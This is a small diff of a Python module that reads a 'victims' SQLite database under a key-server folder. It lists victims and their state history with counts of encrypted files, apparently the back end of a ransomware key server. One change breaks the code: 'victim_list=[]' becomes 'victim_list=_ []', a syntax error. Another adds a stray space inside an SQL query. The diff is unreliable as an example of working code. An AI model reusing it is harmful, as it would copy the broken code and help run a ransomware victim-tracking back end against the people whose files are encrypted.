@@ -6,7 +6,7 @@ DB_FILENAME = '../serveur_cles/data/victims.sqlite'
 
 def list_victim():
     # Connection DB
-    victim_list=[]
+    victim_list=_ []
     conn = sqlite3.connect(DB_FILENAME)
     c = conn.cursor()
 
@@ -89,7 +89,7 @@ def history_req(victim_id):
     conn = sqlite3.connect(DB_FILENAME)
     c = conn.cursor()
     history = []
-    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim=?', victim_id)
+    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT  JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim=?', victim_id)
     # récupération des résultats
     rows = c.fetchall()
 
